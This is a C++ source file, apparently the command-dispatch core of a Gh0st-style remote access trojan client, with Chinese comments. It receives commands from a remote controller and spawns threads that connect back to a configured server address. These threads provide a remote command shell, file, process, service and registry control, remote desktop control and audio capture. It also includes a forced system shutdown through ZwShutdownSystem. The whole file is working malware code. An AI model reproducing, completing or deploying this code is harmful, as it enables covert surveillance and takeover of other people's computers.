#include "Common.h"
#include "KernelManager.h"
#include "RemoteMessageManager.h"
#include "ProcessManager.h"
#include "CmdManager.h"
#include "WindowManager.h"
#include "RemoteController.h"
#include "FileManager.h"
#include "AudioManager.h"
#include "ServiceManager.h"
#include "RegisterManager.h"

extern
char  __ServerAddress[MAX_PATH];
extern
unsigned short __ConnectPort;


CKernelManager::CKernelManager(_CIOCPClient * IOCPClient):CManager(IOCPClient)
{
	memset(m_ThreadHandle, NULL, sizeof(HANDLE) * 0x1000);
	m_ThreadHandleCount = 0;
}

CKernelManager::~CKernelManager()
{
	printf("~CKernelManager()调用销毁CKernelManager对像\r\n");
}

VOID CKernelManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_GET_OUT:
	{
		IsToken = CLIENT_GET_REPLY;
		m_IOCPClient->OnSending((char*)&IsToken, 1);
		break;
	}
	case CLIENT_REMOTE_MESSAGE:
	{
		//启动一个线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RemoteMessageProcedure,
			NULL, 0, NULL);
		break;
	}

	case CLIENT_SHUT_DOWN_REQUEST:
	{
		IsToken = CLIENT_SHUT_DOWN_REPLY;
		m_IOCPClient->OnSending((char*)&IsToken, 1);
		Sleep(1);
		EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_SHUTDOWN_NAME);
		ShutDownSyetem();
		EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_SHUTDOWN_NAME);
		break;
	}
	case CLIENT_CMD_MANAGER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)CmdManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_PROCESS_MANAGER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ProcessManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_WINDOWS_MANAGER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)WindowManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_REMOTE_CONTROLLER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RemoteControllerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_FILE_MANAGER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)FileManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_AUDIO_MANAGER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)AudioManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_SERVICE_MANAGER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ServiceManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_REGISTER_MANAGER:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RegisterManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	
	}
}

VOID CKernelManager::ShutDownSyetem()
{
	typedef void(_stdcall *LPFN_pfnZwShutdownSystem)(int p1);
	HMODULE NtdllModuleBase = NULL;
	LPFN_pfnZwShutdownSystem ZwShutdownSystem = NULL;
	NtdllModuleBase = LoadLibraryA("ntdll.dll");   //FreeLibrary

	if (NtdllModuleBase == NULL)
	{
		return;
	}
	else
	{
		ZwShutdownSystem = (LPFN_pfnZwShutdownSystem)GetProcAddress(NtdllModuleBase, "ZwShutdownSystem");
		if (ZwShutdownSystem == NULL)
		{
			if (NtdllModuleBase != NULL)
			{
				FreeLibrary(NtdllModuleBase);
				NtdllModuleBase = NULL;
			}
			return;
		}
		ZwShutdownSystem(2);
		//关机
		if (NtdllModuleBase != NULL)
		{
			FreeLibrary(NtdllModuleBase);
			NtdllModuleBase = NULL;
		}
		return;
	}
}
//远程消息
DWORD WINAPI RemoteMessageProcedure(LPVOID ParemeterData)
{
	//建立一个新的连接（生成一个新的套接字）
	_CIOCPClient CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CRemoteMessageManager RemoteMessageManager(&CIOCPClient);

	CIOCPClient.WaitingForEvent();

	return 0;
}
//CMD管理
DWORD WINAPI CmdManagerProcedure(LPVOID ParemeterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CCmdManager	CmdManager(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}
//进程管理
DWORD WINAPI ProcessManagerProcedure(LPVOID ParemeterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CProcessManager	ProcessManager(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}

DWORD WINAPI WindowManagerProcedure(LPVOID ParemeterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CWindowManager	WindowManager(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}

DWORD WINAPI RemoteControllerProcedure(LPVOID ParameterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CRemoteController	RemoteController(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}

DWORD WINAPI FileManagerProcedure(LPVOID ParemeterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CFileManager FileManager(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}

DWORD WINAPI AudioManagerProcedure(LPVOID ParemeterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CAudioManager AudioManager(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}


DWORD WINAPI ServiceManagerProcedure(LPVOID ParemeterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CServiceManager ServiceManager(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}

DWORD WINAPI RegisterManagerProcedure(LPVOID ParemeterData)
{
	_CIOCPClient	CIOCPClient;
	if (!CIOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
	{
		return -1;
	}
	CRegisterManager RegisterManager(&CIOCPClient);
	CIOCPClient.WaitingForEvent();
	return 0;
}